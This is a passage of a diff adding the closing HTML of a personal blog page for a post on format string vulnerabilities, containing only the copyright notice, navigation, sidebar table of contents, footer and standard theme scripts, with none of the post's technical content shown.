+    <strong>Post link: </strong>
+    <a href="https://lxonz.github.io/2020/08/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="格式化字符串">https://lxonz.github.io/2020/08/30/格式化字符串/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/29/linux-kernel/" rel="prev" title="linux_kernel">
+      <i class="fa fa-chevron-left"></i> linux_kernel
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E2%80%94%E8%AF%BB"><span class="nav-number">1.</span> <span class="nav-text">格式化字符串—读</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞原理：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">调试分析</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lxonz"
+      src="/images/lxonz.png">
+  <p class="site-author-name" itemprop="name">lxonz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lxonz" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lxonz" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lxonz</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
